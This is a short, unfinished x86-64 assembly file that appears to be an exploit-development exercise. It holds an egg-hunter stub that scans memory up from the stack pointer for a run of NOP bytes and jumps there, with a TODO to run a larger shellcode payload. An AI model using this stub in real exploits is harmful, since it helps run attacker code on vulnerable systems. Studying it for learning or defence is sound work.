global _start

section .text
_start:
; Set up where to read from stack (rsp)
;NOTE: Insert address here!
;Naive implementation to read all thru
    ;Load stack pomter into rsi 
    lea rsi, [rsp] ;
    ; NOTE: May need to add upperbound here
    mov eax, 0x90909090
    ; Compare 0x90909090
findNOP:
    ; Find address where the first four NOPS are located (\x90)
    cmp dword [rsi], eax
    je found

    ;slide window by 1 byte (may need to go down)
    inc rsi
    jmp findNOP


;TODO: Execute big shellcode
found: 
    ; mov rax, 0x00000000000a6f6c6c6548 ;Hello in le
    ; push rax  ;Push string onto stack
    ; mov al, 1          ; write syscall
    ; mov dil, 1          ; set fd to stdout
    ; mov rsi, 'Found' ; string to write
    ; mov dl, 8           ; len of str
    jmp rsi

exit:
    mov rax, 60
    mov rdi, 0
    syscall

